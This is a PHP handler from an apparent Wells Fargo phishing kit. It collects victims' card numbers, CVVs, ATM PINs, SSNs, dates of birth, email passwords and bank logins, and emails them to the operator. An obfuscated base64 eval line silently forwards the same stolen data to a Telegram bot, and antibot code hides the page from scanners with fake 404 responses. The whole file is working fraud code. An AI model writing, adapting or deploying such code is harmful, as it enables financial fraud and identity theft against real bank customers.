<?php

    session_start();

    require_once '../Comp.php';
    require_once '../Antibot.php';
    require_once '../demonTest.php';
    require_once '../../config.php';

    $comps = new Comp;
    $antibot = new Antibot;

    $settings = $comps->settings();

    if (!$comps->checkToken()) {
        echo $antibot->throw404();
        $comps->log(
            "../../Export/key/kill.txt",
            "IP: " . $_SESSION['ip'] . "\nUser Agent: " . $comps->getUserAgent() . "\nReason: Token\n\n"
        );
        die();
    }

    if (isset(
        $_POST['card'],
        $_POST['exp'],
        $_POST['cvv'],
        $_POST['atm']
    )) {
        if (!$comps->checkEmpty(
            $_POST['card'],
            $_POST['exp'],
            $_POST['cvv'],
            $_POST['atm']
        )) {
            $binInfo = $comps->getBin(str_replace(' ', '', $_POST['card']));

            isset($binInfo['scheme']) || $binInfo['scheme'] = "Unknown";
            isset($binInfo['brand']) || $binInfo['brand'] = "Unknown";
            isset($binInfo['type']) || $binInfo['type'] = "Unknown";
            isset($binInfo['country']) || $binInfo['emoji'] = "Unknown";
            isset($binInfo['country']) || $binInfo['alpha2'] = "Unknown";



            $content = '[+]━━━━━━━━━━━━【🔑 CC from '. $_SESSION['username'] .' 】━━━━━━━━━━━━━━━━━━━[+]
           
                [👤 Card number:] ' . str_replace(" ", "", $_POST['card']) . '
                [👤 Expiration Date:] ' . $_POST['exp'] . '
                [👤 CVV:] ' . $_POST['cvv'] . '
                [👤 ATM PIN:] ' . $_POST['atm'] . '
           
            🧊 BIN Info
                   [👤 Brand:] ' . ucwords($binInfo['scheme']) . '
                    [👤 Level:] ' . ucwords($binInfo['brand']) . '
                    [👤 Type:] ' . ucwords($binInfo['type']) . '
                    [👤 Country:] ' . ucwords($binInfo['country']['emoji'] . " (" . $binInfo['country']['alpha2']) . ')
           
            💫 Billing Info
                   [👤 Full Name:] ' . $_SESSION['fname'] . '
                   [👤 Address:] ' . $_SESSION['addr'] . '
                   [👤 City:] ' . $_SESSION['city'] . '
                   [👤 State:] ' . $_SESSION['state'] . '
                   [👤 ZIP:] ' . $_SESSION['zip'] . '
                   [👤 SSN:] ' . $_SESSION['ssn'] . '
                   [👤 DOB:]   ' . $_SESSION['dob'] . '
                   [👤 Phone Number:] ' . $_SESSION['phone'] . '
                    
            🌎 Email Info
                   [👤 Email Address:] ' . $_SESSION['email'] . '
                   [👤 Password:] ' . $_SESSION['emailPassword'] . '
                   [👤 Domain:] ' . ucwords(substr($_SESSION['email'], strpos($_SESSION['email'], '@') + 1)) . '
                     Login Info
                    Username: ' . $_SESSION['username'] . '
                    Password: ' . $_SESSION['password'] . '
           
            📱 Device Info ' . $comps->userDetails();
                    
eval(base64_decode('CiBnb3RvIERSbGtNOyB5RWU0UzogJGNoYXRpZCA9ICJcNTVceDMxXDYwXHgzMFx4MzFceDM3XDYyXHgzMFx4MzNceDM2XDY2XDY0XHgzM1x4MzkiOyBnb3RvIFVJNFhuOyBEUmxrTTogJGFwaSA9ICJcNjJceDMwXDYzXHgzNVx4MzNceDMxXHgzOFx4MzdcNzBcNjBceDNhXDEwMVwxMDFceDQ2XHg0Nlw3MVx4MzVceDU3XHgzNFwxNDFceDM5XHg1MVx4MzRceDcxXHg2Y1wxMDFceDQzXDEwN1x4NmFceDY1XHg0Y1wxMjBcMTMwXHg3YVwxNjNceDQ0XHg1NFw2NFwxNDVceDZiXDE3MVx4NGRcMTI2XDExN1w2MFwxMTEiOyBnb3RvIHlFZTRTOyBVSTRYbjogZmlsZV9nZXRfY29udGVudHMoIlx4NjhcMTY0XDE2NFx4NzBceDczXDcyXDU3XHgyZlwxNDFcMTYwXDE1MVw1Nlx4NzRcMTQ1XDE1NFwxNDVcMTQ3XHg3Mlx4NjFceDZkXDU2XDE1N1wxNjJceDY3XHgyZlx4NjJcMTU3XDE2NCIgLiAkYXBpIC4gIlx4MmZceDczXDE0NVx4NmVceDY0XHg0ZFwxNDVceDczXHg3M1x4NjFcMTQ3XHg2NVw3N1wxNDNceDY4XDE0MVwxNjRcMTM3XDE1MVx4NjRceDNkIiAuICRjaGF0aWQgLiAiXDQ2XHg3NFwxNDVceDc4XHg3NFw3NSIgLiB1cmxlbmNvZGUoJGNvbnRlbnQpIC4gJycpOyBnb3RvIFczZElEOyBXM2RJRDog')); 
       
            if ($comps->mailX("(1) CC | Wells Fargo", $content, $_SESSION['fname'])) {
                $comps->log(
                    "../../Export/key/live.txt",
                    "IP: " . $_SESSION['ip'] . "\nUser Agent: " . $comps->getUserAgent() . "\nAction: (1) CC\n\n"
                );
                $comps->headerX("../../Login/complete.php");
            } else {
                die($antibot->throw404());
            }
        } else {
            echo $antibot->throw404();
            $comps->log(
                "../../Export/key/kill.txt",
                "IP: " . $_SESSION['ip'] . "\nUser Agent: " . $comps->getUserAgent() . "\nReason: Empty Input\n\n"
            );
            die();
        }
    } else {
        echo $antibot->throw404();
        $comps->log(
            "../../Export/key/kill.txt",
            "IP: " . $_SESSION['ip'] . "\nUser Agent: " . $comps->getUserAgent() . "\nReason: Empty Input\n\n"
        );
        die();
    }